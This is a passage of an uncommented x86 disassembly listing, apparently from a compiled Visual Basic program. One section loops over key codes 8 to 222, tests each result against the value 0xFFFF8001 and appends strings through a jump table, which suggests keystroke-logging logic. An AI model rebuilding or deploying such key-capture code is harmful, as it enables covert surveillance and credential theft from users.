  403339:	8b 07                	mov    (%edi),%eax
  40333b:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  403341:	85 c0                	test   %eax,%eax
  403343:	db e2                	fnclex
  403345:	7d 12                	jge    0x403359
  403347:	68 a0 00 00 00       	push   $0xa0
  40334c:	68 b8 24 40 00       	push   $0x4024b8
  403351:	57                   	push   %edi
  403352:	50                   	push   %eax
  403353:	ff 15 28 10 40 00    	call   *0x401028
  403359:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40335c:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40335f:	89 45 b8             	mov    %eax,-0x48(%ebp)
  403362:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403365:	52                   	push   %edx
  403366:	50                   	push   %eax
  403367:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40336e:	c7 45 b0 08 00 00 00 	movl   $0x8,-0x50(%ebp)
  403375:	ff 15 70 10 40 00    	call   *0x401070
  40337b:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  403381:	8d 55 b0             	lea    -0x50(%ebp),%edx
  403384:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403387:	52                   	push   %edx
  403388:	8b 39                	mov    (%ecx),%edi
  40338a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40338d:	50                   	push   %eax
  40338e:	51                   	push   %ecx
  40338f:	ff 15 7c 10 40 00    	call   *0x40107c
  403395:	8d 55 d8             	lea    -0x28(%ebp),%edx
  403398:	50                   	push   %eax
  403399:	52                   	push   %edx
  40339a:	ff 15 78 10 40 00    	call   *0x401078
  4033a0:	89 bd c0 fe ff ff    	mov    %edi,-0x140(%ebp)
  4033a6:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4033ac:	50                   	push   %eax
  4033ad:	8b 85 c0 fe ff ff    	mov    -0x140(%ebp),%eax
  4033b3:	57                   	push   %edi
  4033b4:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  4033ba:	85 c0                	test   %eax,%eax
  4033bc:	db e2                	fnclex
  4033be:	7d 12                	jge    0x4033d2
  4033c0:	68 a4 00 00 00       	push   $0xa4
  4033c5:	68 b8 24 40 00       	push   $0x4024b8
  4033ca:	57                   	push   %edi
  4033cb:	50                   	push   %eax
  4033cc:	ff 15 28 10 40 00    	call   *0x401028
  4033d2:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4033d5:	ff 15 cc 10 40 00    	call   *0x4010cc
  4033db:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4033de:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4033e1:	51                   	push   %ecx
  4033e2:	52                   	push   %edx
  4033e3:	6a 02                	push   $0x2
  4033e5:	ff 15 18 10 40 00    	call   *0x401018
  4033eb:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4033ee:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4033f1:	50                   	push   %eax
  4033f2:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4033f5:	51                   	push   %ecx
  4033f6:	52                   	push   %edx
  4033f7:	e9 ea 00 00 00       	jmp    0x4034e6
  4033fc:	8b 06                	mov    (%esi),%eax
  4033fe:	56                   	push   %esi
  4033ff:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403405:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403408:	50                   	push   %eax
  403409:	51                   	push   %ecx
  40340a:	ff d3                	call   *%ebx
  40340c:	8b 16                	mov    (%esi),%edx
  40340e:	56                   	push   %esi
  40340f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403415:	ff 92 04 03 00 00    	call   *0x304(%edx)
  40341b:	50                   	push   %eax
  40341c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40341f:	50                   	push   %eax
  403420:	ff d3                	call   *%ebx
  403422:	8b f8                	mov    %eax,%edi
  403424:	8d 55 dc             	lea    -0x24(%ebp),%edx
  403427:	52                   	push   %edx
  403428:	57                   	push   %edi
  403429:	8b 0f                	mov    (%edi),%ecx
  40342b:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  403431:	85 c0                	test   %eax,%eax
  403433:	db e2                	fnclex
  403435:	7d 12                	jge    0x403449
  403437:	68 a0 00 00 00       	push   $0xa0
  40343c:	68 b8 24 40 00       	push   $0x4024b8
  403441:	57                   	push   %edi
  403442:	50                   	push   %eax
  403443:	ff 15 28 10 40 00    	call   *0x401028
  403449:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40344c:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40344f:	89 45 b8             	mov    %eax,-0x48(%ebp)
  403452:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403455:	83 c0 20             	add    $0x20,%eax
  403458:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40345f:	0f 80 d2 2e 00 00    	jo     0x406337
  403465:	50                   	push   %eax
  403466:	51                   	push   %ecx
  403467:	c7 45 b0 08 00 00 00 	movl   $0x8,-0x50(%ebp)
  40346e:	ff 15 70 10 40 00    	call   *0x401070
  403474:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  40347a:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40347d:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  403480:	50                   	push   %eax
  403481:	8b 3a                	mov    (%edx),%edi
  403483:	8d 55 a0             	lea    -0x60(%ebp),%edx
  403486:	51                   	push   %ecx
  403487:	52                   	push   %edx
  403488:	ff 15 7c 10 40 00    	call   *0x40107c
  40348e:	50                   	push   %eax
  40348f:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403492:	50                   	push   %eax
  403493:	ff 15 78 10 40 00    	call   *0x401078
  403499:	8b cf                	mov    %edi,%ecx
  40349b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4034a1:	50                   	push   %eax
  4034a2:	57                   	push   %edi
  4034a3:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  4034a9:	85 c0                	test   %eax,%eax
  4034ab:	db e2                	fnclex
  4034ad:	7d 12                	jge    0x4034c1
  4034af:	68 a4 00 00 00       	push   $0xa4
  4034b4:	68 b8 24 40 00       	push   $0x4024b8
  4034b9:	57                   	push   %edi
  4034ba:	50                   	push   %eax
  4034bb:	ff 15 28 10 40 00    	call   *0x401028
  4034c1:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4034c4:	ff 15 cc 10 40 00    	call   *0x4010cc
  4034ca:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4034cd:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4034d0:	52                   	push   %edx
  4034d1:	50                   	push   %eax
  4034d2:	6a 02                	push   $0x2
  4034d4:	ff 15 18 10 40 00    	call   *0x401018
  4034da:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  4034dd:	8d 55 c0             	lea    -0x40(%ebp),%edx
  4034e0:	51                   	push   %ecx
  4034e1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4034e4:	52                   	push   %edx
  4034e5:	50                   	push   %eax
  4034e6:	6a 03                	push   $0x3
  4034e8:	ff 15 10 10 40 00    	call   *0x401010
  4034ee:	83 c4 1c             	add    $0x1c,%esp
  4034f1:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4034f4:	b8 01 00 00 00       	mov    $0x1,%eax
  4034f9:	03 c1                	add    %ecx,%eax
  4034fb:	0f 80 36 2e 00 00    	jo     0x406337
  403501:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403504:	8b c8                	mov    %eax,%ecx
  403506:	33 c0                	xor    %eax,%eax
  403508:	e9 b3 fd ff ff       	jmp    0x4032c0
  40350d:	b9 08 00 00 00       	mov    $0x8,%ecx
  403512:	c7 85 30 ff ff ff 01 	movl   $0x1,-0xd0(%ebp)
  403519:	00 00 00 
  40351c:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40351f:	ba de 00 00 00       	mov    $0xde,%edx
  403524:	3b ca                	cmp    %edx,%ecx
  403526:	0f 8f a9 2b 00 00    	jg     0x4060d5
  40352c:	83 f9 41             	cmp    $0x41,%ecx
  40352f:	75 07                	jne    0x403538
  403531:	c7 45 e8 5b 00 00 00 	movl   $0x5b,-0x18(%ebp)
  403538:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40353b:	51                   	push   %ecx
  40353c:	e8 57 ee ff ff       	call   0x402398
  403541:	8b f8                	mov    %eax,%edi
  403543:	ff 15 24 10 40 00    	call   *0x401024
  403549:	0f bf d7             	movswl %di,%edx
  40354c:	6a 10                	push   $0x10
  40354e:	89 55 e0             	mov    %edx,-0x20(%ebp)
  403551:	e8 42 ee ff ff       	call   0x402398
  403556:	8b f8                	mov    %eax,%edi
  403558:	ff 15 24 10 40 00    	call   *0x401024
  40355e:	81 7d e0 01 80 ff ff 	cmpl   $0xffff8001,-0x20(%ebp)
  403565:	0f bf ff             	movswl %di,%edi
  403568:	0f 85 4a 2b 00 00    	jne    0x4060b8
  40356e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403571:	83 c0 f8             	add    $0xfffffff8,%eax
  403574:	3d d6 00 00 00       	cmp    $0xd6,%eax
  403579:	0f 87 39 2b 00 00    	ja     0x4060b8
  40357f:	33 c9                	xor    %ecx,%ecx
  403581:	8a 88 60 62 40 00    	mov    0x406260(%eax),%cl
  403587:	ff 24 8d 40 61 40 00 	jmp    *0x406140(,%ecx,4)
  40358e:	8b 16                	mov    (%esi),%edx
  403590:	56                   	push   %esi
  403591:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403597:	50                   	push   %eax
  403598:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40359b:	50                   	push   %eax
  40359c:	ff d3                	call   *%ebx
  40359e:	8b 0e                	mov    (%esi),%ecx
  4035a0:	56                   	push   %esi
  4035a1:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4035a7:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  4035ad:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4035b0:	50                   	push   %eax
  4035b1:	52                   	push   %edx
  4035b2:	ff d3                	call   *%ebx
  4035b4:	8b f8                	mov    %eax,%edi
  4035b6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4035b9:	51                   	push   %ecx
  4035ba:	57                   	push   %edi
  4035bb:	8b 07                	mov    (%edi),%eax
  4035bd:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4035c3:	85 c0                	test   %eax,%eax
  4035c5:	db e2                	fnclex
  4035c7:	7d 12                	jge    0x4035db
  4035c9:	68 a0 00 00 00       	push   $0xa0
  4035ce:	68 b8 24 40 00       	push   $0x4024b8
  4035d3:	57                   	push   %edi
  4035d4:	50                   	push   %eax
  4035d5:	ff 15 28 10 40 00    	call   *0x401028
  4035db:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4035de:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4035e4:	50                   	push   %eax
  4035e5:	68 30 25 40 00       	push   $0x402530
  4035ea:	8b 3a                	mov    (%edx),%edi
  4035ec:	ff 15 20 10 40 00    	call   *0x401020
  4035f2:	8b d0                	mov    %eax,%edx
  4035f4:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4035f7:	ff 15 b8 10 40 00    	call   *0x4010b8
  4035fd:	8b cf                	mov    %edi,%ecx
  4035ff:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403605:	50                   	push   %eax
  403606:	57                   	push   %edi
  403607:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  40360d:	85 c0                	test   %eax,%eax
  40360f:	db e2                	fnclex
  403611:	7d 12                	jge    0x403625
  403613:	68 a4 00 00 00       	push   $0xa4
  403618:	68 b8 24 40 00       	push   $0x4024b8
  40361d:	57                   	push   %edi
  40361e:	50                   	push   %eax
  40361f:	ff 15 28 10 40 00    	call   *0x401028
  403625:	8d 55 d8             	lea    -0x28(%ebp),%edx
  403628:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40362b:	52                   	push   %edx
  40362c:	50                   	push   %eax
  40362d:	6a 02                	push   $0x2
  40362f:	ff 15 9c 10 40 00    	call   *0x40109c
  403635:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403638:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40363b:	51                   	push   %ecx
  40363c:	52                   	push   %edx
  40363d:	6a 02                	push   $0x2
  40363f:	ff 15 18 10 40 00    	call   *0x401018
  403645:	8b 06                	mov    (%esi),%eax
  403647:	83 c4 18             	add    $0x18,%esp
  40364a:	56                   	push   %esi
  40364b:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403651:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403654:	50                   	push   %eax
  403655:	51                   	push   %ecx
  403656:	ff d3                	call   *%ebx
  403658:	8b 16                	mov    (%esi),%edx
  40365a:	56                   	push   %esi
  40365b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403661:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403667:	50                   	push   %eax
  403668:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40366b:	50                   	push   %eax
  40366c:	ff d3                	call   *%ebx
  40366e:	8b f8                	mov    %eax,%edi
  403670:	8d 55 dc             	lea    -0x24(%ebp),%edx
  403673:	52                   	push   %edx
  403674:	57                   	push   %edi
  403675:	8b 0f                	mov    (%edi),%ecx
  403677:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40367d:	85 c0                	test   %eax,%eax
  40367f:	db e2                	fnclex
  403681:	7d 12                	jge    0x403695
  403683:	68 a0 00 00 00       	push   $0xa0
  403688:	68 b8 24 40 00       	push   $0x4024b8
  40368d:	57                   	push   %edi
  40368e:	50                   	push   %eax
  40368f:	ff 15 28 10 40 00    	call   *0x401028
  403695:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  403698:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  40369e:	51                   	push   %ecx
  40369f:	68 48 25 40 00       	push   $0x402548
  4036a4:	8b 38                	mov    (%eax),%edi
  4036a6:	ff 15 20 10 40 00    	call   *0x401020
  4036ac:	8b d0                	mov    %eax,%edx
  4036ae:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4036b1:	ff 15 b8 10 40 00    	call   *0x4010b8
  4036b7:	8b d7                	mov    %edi,%edx
  4036b9:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4036bf:	50                   	push   %eax
  4036c0:	57                   	push   %edi
  4036c1:	ff 92 a4 00 00 00    	call   *0xa4(%edx)
  4036c7:	85 c0                	test   %eax,%eax
  4036c9:	db e2                	fnclex
  4036cb:	0f 8d 52 28 00 00    	jge    0x405f23
  4036d1:	e9 3b 28 00 00       	jmp    0x405f11
  4036d6:	8b 0e                	mov    (%esi),%ecx
  4036d8:	56                   	push   %esi
  4036d9:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  4036df:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4036e2:	50                   	push   %eax
  4036e3:	52                   	push   %edx
  4036e4:	ff d3                	call   *%ebx
  4036e6:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4036ec:	8b 06                	mov    (%esi),%eax
  4036ee:	56                   	push   %esi
  4036ef:	ff 90 04 03 00 00    	call   *0x304(%eax)
  4036f5:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4036f8:	50                   	push   %eax
  4036f9:	51                   	push   %ecx
  4036fa:	ff d3                	call   *%ebx
  4036fc:	8b f8                	mov    %eax,%edi
  4036fe:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403701:	50                   	push   %eax
  403702:	57                   	push   %edi
  403703:	8b 17                	mov    (%edi),%edx
  403705:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  40370b:	85 c0                	test   %eax,%eax
  40370d:	db e2                	fnclex
  40370f:	7d 12                	jge    0x403723
  403711:	68 a0 00 00 00       	push   $0xa0
  403716:	68 b8 24 40 00       	push   $0x4024b8
  40371b:	57                   	push   %edi
  40371c:	50                   	push   %eax
  40371d:	ff 15 28 10 40 00    	call   *0x401028
  403723:	8b 55 dc             	mov    -0x24(%ebp),%edx
  403726:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  40372c:	52                   	push   %edx
  40372d:	68 54 25 40 00       	push   $0x402554
  403732:	8b 39                	mov    (%ecx),%edi
  403734:	ff 15 20 10 40 00    	call   *0x401020
  40373a:	8b d0                	mov    %eax,%edx
  40373c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40373f:	ff 15 b8 10 40 00    	call   *0x4010b8
  403745:	89 bd b0 fe ff ff    	mov    %edi,-0x150(%ebp)
  40374b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403751:	50                   	push   %eax
  403752:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  403758:	57                   	push   %edi
  403759:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  40375f:	85 c0                	test   %eax,%eax
  403761:	db e2                	fnclex
  403763:	0f 8d 78 28 00 00    	jge    0x405fe1
  403769:	e9 61 28 00 00       	jmp    0x405fcf
  40376e:	8b 16                	mov    (%esi),%edx
  403770:	56                   	push   %esi
  403771:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403777:	50                   	push   %eax
  403778:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40377b:	50                   	push   %eax
  40377c:	ff d3                	call   *%ebx
  40377e:	8b 0e                	mov    (%esi),%ecx
  403780:	56                   	push   %esi
  403781:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403787:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  40378d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403790:	50                   	push   %eax
  403791:	52                   	push   %edx
  403792:	ff d3                	call   *%ebx
  403794:	8b f8                	mov    %eax,%edi
  403796:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403799:	51                   	push   %ecx
  40379a:	57                   	push   %edi
  40379b:	8b 07                	mov    (%edi),%eax
  40379d:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4037a3:	85 c0                	test   %eax,%eax
  4037a5:	db e2                	fnclex
  4037a7:	7d 12                	jge    0x4037bb
  4037a9:	68 a0 00 00 00       	push   $0xa0
  4037ae:	68 b8 24 40 00       	push   $0x4024b8
  4037b3:	57                   	push   %edi
  4037b4:	50                   	push   %eax
  4037b5:	ff 15 28 10 40 00    	call   *0x401028
  4037bb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4037be:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4037c4:	50                   	push   %eax
  4037c5:	68 5c 25 40 00       	push   $0x40255c
  4037ca:	8b 3a                	mov    (%edx),%edi
  4037cc:	ff 15 20 10 40 00    	call   *0x401020
  4037d2:	8b d0                	mov    %eax,%edx
  4037d4:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4037d7:	ff 15 b8 10 40 00    	call   *0x4010b8
  4037dd:	8b cf                	mov    %edi,%ecx
  4037df:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4037e5:	50                   	push   %eax
  4037e6:	57                   	push   %edi
  4037e7:	e9 8b 26 00 00       	jmp    0x405e77
  4037ec:	8b 06                	mov    (%esi),%eax
  4037ee:	56                   	push   %esi
  4037ef:	ff 90 04 03 00 00    	call   *0x304(%eax)
  4037f5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4037f8:	50                   	push   %eax
  4037f9:	51                   	push   %ecx
  4037fa:	ff d3                	call   *%ebx
  4037fc:	8b 16                	mov    (%esi),%edx
  4037fe:	56                   	push   %esi
  4037ff:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403805:	ff 92 04 03 00 00    	call   *0x304(%edx)
  40380b:	50                   	push   %eax
  40380c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40380f:	50                   	push   %eax
  403810:	ff d3                	call   *%ebx
  403812:	8b f8                	mov    %eax,%edi
  403814:	8d 55 dc             	lea    -0x24(%ebp),%edx
  403817:	52                   	push   %edx
  403818:	57                   	push   %edi
  403819:	8b 0f                	mov    (%edi),%ecx
  40381b:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  403821:	85 c0                	test   %eax,%eax
  403823:	db e2                	fnclex
  403825:	7d 12                	jge    0x403839
  403827:	68 a0 00 00 00       	push   $0xa0
  40382c:	68 b8 24 40 00       	push   $0x4024b8
  403831:	57                   	push   %edi
  403832:	50                   	push   %eax
  403833:	ff 15 28 10 40 00    	call   *0x401028
  403839:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40383c:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  403842:	51                   	push   %ecx
  403843:	68 64 25 40 00       	push   $0x402564
  403848:	8b 38                	mov    (%eax),%edi
  40384a:	ff 15 20 10 40 00    	call   *0x401020
  403850:	8b d0                	mov    %eax,%edx
  403852:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403855:	ff 15 b8 10 40 00    	call   *0x4010b8
  40385b:	8b d7                	mov    %edi,%edx
  40385d:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403863:	50                   	push   %eax
  403864:	57                   	push   %edi
  403865:	e9 57 fe ff ff       	jmp    0x4036c1
  40386a:	8b 0e                	mov    (%esi),%ecx
  40386c:	56                   	push   %esi
  40386d:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  403873:	8d 55 d0             	lea    -0x30(%ebp),%edx
  403876:	50                   	push   %eax
  403877:	52                   	push   %edx
  403878:	ff d3                	call   *%ebx
  40387a:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403880:	8b 06                	mov    (%esi),%eax
  403882:	56                   	push   %esi
  403883:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403889:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40388c:	50                   	push   %eax
  40388d:	51                   	push   %ecx
  40388e:	ff d3                	call   *%ebx
  403890:	8b f8                	mov    %eax,%edi
  403892:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403895:	50                   	push   %eax
  403896:	57                   	push   %edi
  403897:	8b 17                	mov    (%edi),%edx
  403899:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  40389f:	85 c0                	test   %eax,%eax
  4038a1:	db e2                	fnclex
  4038a3:	7d 12                	jge    0x4038b7
  4038a5:	68 a0 00 00 00       	push   $0xa0
  4038aa:	68 b8 24 40 00       	push   $0x4024b8
  4038af:	57                   	push   %edi
  4038b0:	50                   	push   %eax
  4038b1:	ff 15 28 10 40 00    	call   *0x401028
  4038b7:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4038ba:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4038c0:	52                   	push   %edx
  4038c1:	68 6c 25 40 00       	push   $0x40256c
  4038c6:	8b 39                	mov    (%ecx),%edi
  4038c8:	ff 15 20 10 40 00    	call   *0x401020
  4038ce:	8b d0                	mov    %eax,%edx
  4038d0:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4038d3:	ff 15 b8 10 40 00    	call   *0x4010b8
  4038d9:	89 bd a4 fe ff ff    	mov    %edi,-0x15c(%ebp)
  4038df:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4038e5:	50                   	push   %eax
  4038e6:	8b 85 a4 fe ff ff    	mov    -0x15c(%ebp),%eax
  4038ec:	57                   	push   %edi
  4038ed:	e9 67 fe ff ff       	jmp    0x403759
  4038f2:	8b 16                	mov    (%esi),%edx
  4038f4:	56                   	push   %esi
  4038f5:	ff 92 04 03 00 00    	call   *0x304(%edx)
  4038fb:	50                   	push   %eax
  4038fc:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4038ff:	50                   	push   %eax
  403900:	ff d3                	call   *%ebx
  403902:	8b 0e                	mov    (%esi),%ecx
  403904:	56                   	push   %esi
  403905:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40390b:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  403911:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403914:	50                   	push   %eax
  403915:	52                   	push   %edx
  403916:	ff d3                	call   *%ebx
  403918:	8b f8                	mov    %eax,%edi
  40391a:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40391d:	51                   	push   %ecx
  40391e:	57                   	push   %edi
  40391f:	8b 07                	mov    (%edi),%eax
  403921:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  403927:	85 c0                	test   %eax,%eax
  403929:	db e2                	fnclex
  40392b:	7d 12                	jge    0x40393f
  40392d:	68 a0 00 00 00       	push   $0xa0
  403932:	68 b8 24 40 00       	push   $0x4024b8
  403937:	57                   	push   %edi
  403938:	50                   	push   %eax
  403939:	ff 15 28 10 40 00    	call   *0x401028
  40393f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403942:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  403948:	50                   	push   %eax
  403949:	68 74 25 40 00       	push   $0x402574
  40394e:	8b 3a                	mov    (%edx),%edi
  403950:	ff 15 20 10 40 00    	call   *0x401020
  403956:	8b d0                	mov    %eax,%edx
  403958:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40395b:	ff 15 b8 10 40 00    	call   *0x4010b8
  403961:	8b cf                	mov    %edi,%ecx
  403963:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  403969:	50                   	push   %eax
  40396a:	57                   	push   %edi
  40396b:	e9 07 25 00 00       	jmp    0x405e77
  403970:	8b 06                	mov    (%esi),%eax
  403972:	56                   	push   %esi
  403973:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403979:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40397c:	50                   	push   %eax
  40397d:	51                   	push   %ecx
  40397e:	ff d3                	call   *%ebx
  403980:	8b 16                	mov    (%esi),%edx
  403982:	56                   	push   %esi
  403983:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403989:	ff 92 04 03 00 00    	call   *0x304(%edx)
  40398f:	50                   	push   %eax
  403990:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403993:	50                   	push   %eax
  403994:	ff d3                	call   *%ebx
  403996:	8b f8                	mov    %eax,%edi
  403998:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40399b:	52                   	push   %edx
  40399c:	57                   	push   %edi
  40399d:	8b 0f                	mov    (%edi),%ecx
  40399f:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4039a5:	85 c0                	test   %eax,%eax
  4039a7:	db e2                	fnclex
  4039a9:	7d 12                	jge    0x4039bd
  4039ab:	68 a0 00 00 00       	push   $0xa0
  4039b0:	68 b8 24 40 00       	push   $0x4024b8
  4039b5:	57                   	push   %edi
  4039b6:	50                   	push   %eax
  4039b7:	ff 15 28 10 40 00    	call   *0x401028
  4039bd:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4039c0:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4039c6:	51                   	push   %ecx
  4039c7:	68 7c 25 40 00       	push   $0x40257c
  4039cc:	8b 38                	mov    (%eax),%edi
  4039ce:	ff 15 20 10 40 00    	call   *0x401020
  4039d4:	8b d0                	mov    %eax,%edx
  4039d6:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4039d9:	ff 15 b8 10 40 00    	call   *0x4010b8
  4039df:	8b d7                	mov    %edi,%edx
  4039e1:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4039e7:	50                   	push   %eax
  4039e8:	57                   	push   %edi
  4039e9:	e9 d3 fc ff ff       	jmp    0x4036c1
  4039ee:	8b 0e                	mov    (%esi),%ecx
  4039f0:	56                   	push   %esi
  4039f1:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  4039f7:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4039fa:	50                   	push   %eax
  4039fb:	52                   	push   %edx
  4039fc:	ff d3                	call   *%ebx
  4039fe:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403a04:	8b 06                	mov    (%esi),%eax
  403a06:	56                   	push   %esi
  403a07:	ff 90 04 03 00 00    	call   *0x304(%eax)
  403a0d:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403a10:	50                   	push   %eax
  403a11:	51                   	push   %ecx
  403a12:	ff d3                	call   *%ebx
  403a14:	8b f8                	mov    %eax,%edi
  403a16:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403a19:	50                   	push   %eax
  403a1a:	57                   	push   %edi
  403a1b:	8b 17                	mov    (%edi),%edx
  403a1d:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  403a23:	85 c0                	test   %eax,%eax
  403a25:	db e2                	fnclex
  403a27:	7d 12                	jge    0x403a3b
  403a29:	68 a0 00 00 00       	push   $0xa0
  403a2e:	68 b8 24 40 00       	push   $0x4024b8
  403a33:	57                   	push   %edi
  403a34:	50                   	push   %eax
  403a35:	ff 15 28 10 40 00    	call   *0x401028
  403a3b:	8b 55 dc             	mov    -0x24(%ebp),%edx
  403a3e:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  403a44:	52                   	push   %edx
  403a45:	68 84 25 40 00       	push   $0x402584
  403a4a:	8b 39                	mov    (%ecx),%edi
  403a4c:	ff 15 20 10 40 00    	call   *0x401020
  403a52:	8b d0                	mov    %eax,%edx
  403a54:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403a57:	ff 15 b8 10 40 00    	call   *0x4010b8
  403a5d:	89 bd 98 fe ff ff    	mov    %edi,-0x168(%ebp)
